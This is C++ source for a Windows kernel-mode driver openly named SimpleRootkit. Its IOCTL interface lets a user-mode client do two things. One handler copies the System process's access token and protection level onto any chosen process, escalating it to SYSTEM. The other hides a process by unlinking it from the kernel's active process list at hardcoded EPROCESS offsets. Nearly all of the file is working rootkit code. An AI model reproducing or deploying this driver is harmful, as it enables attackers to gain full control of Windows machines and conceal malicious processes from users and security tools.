#include <ntifs.h>
#include "ioctl.hpp"
#include "Common.hpp"
#include "Driver.h"

void DriverCleanup(PDRIVER_OBJECT DriverObject);
NTSTATUS CreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
NTSTATUS GimmeToken(INT PID, OPTIONAL IN INT PID_FROM = 4);
NTSTATUS HideMe(INT PID);
UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\SimpleRootkit");
UNICODE_STRING symlink = RTL_CONSTANT_STRING(L"\\??\\SimpleRootkit");

extern "C"
NTSTATUS
DriverEntry(
	_In_ PDRIVER_OBJECT DriverObject,
	_In_ PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);
	DriverObject->DriverUnload = DriverCleanup;

	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;
	
	PDEVICE_OBJECT deviceObject;
	NTSTATUS status = IoCreateDevice(
		DriverObject,
		0,
		&deviceName,
		FILE_DEVICE_UNKNOWN,
		0,
		FALSE,
		&deviceObject
	);

	if (!NT_SUCCESS(status))
	{
		return status;
	}
	
	status = IoCreateSymbolicLink(&symlink, &deviceName);

	if (!NT_SUCCESS(status))
	{
		IoDeleteDevice(deviceObject);
		return status;
	}

	return STATUS_SUCCESS;
}

NTSTATUS
DeviceControl(
	_In_ PDEVICE_OBJECT DeviceObject,
	_In_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
	NTSTATUS status = STATUS_SUCCESS;
	ULONG_PTR length = 0;

	switch (stack->Parameters.DeviceIoControl.IoControlCode)
	{
	case IOCTL_PID_LEVEL_UP:
	{

		if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(PID_LVL_UP))
		{
			status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		PID_LVL_UP* data = (PID_LVL_UP*)stack->Parameters.DeviceIoControl.Type3InputBuffer;

		if (data == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		int PID_giver = data->PID_giver;
		int PID_receiver = data->PID_receiver;
		GimmeToken(PID_receiver, PID_giver);



		break;
	}

	case IOCTL_PID_HIDE_ME_BABY:
	{

		if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(PID_hider))
		{
			status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		PID_hider* data = (PID_hider*)stack->Parameters.DeviceIoControl.Type3InputBuffer;

		if (data == nullptr)
		{
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		HideMe(data->PID);

		break;

	}

	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = length;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return status;
}

NTSTATUS
CreateClose(
	_In_ PDEVICE_OBJECT DeviceObject,
	_In_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

void
DriverCleanup(
	PDRIVER_OBJECT DriverObject
)
{
	IoDeleteSymbolicLink(&symlink);
	IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS
HideMe(
	INT PID
) {
	PEPROCESS eproc;
	PsLookupProcessByProcessId((HANDLE)PID, &eproc);

	
		LIST_ENTRY *eproc_list_entry = (LIST_ENTRY*)((ULONG_PTR)eproc + 0x448);

		eproc_list_entry->Blink->Flink = eproc_list_entry->Flink;
		eproc_list_entry->Flink->Blink = eproc_list_entry->Blink;


		return STATUS_SUCCESS;
}

NTSTATUS 
GimmeToken(
	INT PID, OPTIONAL IN INT PID_FROM
) {
	if (!PID_FROM)
		PID_FROM = 4;
	PEPROCESS eproc_receiver,eproc_giver ;

	PsLookupProcessByProcessId((HANDLE)PID, &eproc_receiver);
	PsLookupProcessByProcessId((HANDLE)PID_FROM, &eproc_giver);

	protect *eproc_giver_prot =  (protect*)((ULONG_PTR)eproc_giver + 0x879);//(PVOID)prot_offset;
	protect *eproc_receiver_prot = (protect*)((ULONG_PTR)eproc_receiver + 0x879);//(PVOID)prot_offset;

///// NOW SWAP TIME

	int token_off = 0x4b8;

	eproc_receiver_prot->Protection.Level		=		eproc_giver_prot->Protection.Level;
	eproc_receiver_prot->Protection.Type		=		eproc_giver_prot->Protection.Type;
	eproc_receiver_prot->Protection.Signer		=		eproc_giver_prot->Protection.Signer;
	eproc_receiver_prot->SectionSignatureLevel	=		eproc_giver_prot->SectionSignatureLevel;

	*(ULONG64*)((ULONG64)eproc_receiver + token_off) = *(ULONG64*)((ULONG64)eproc_giver + token_off);


	return STATUS_SUCCESS;

}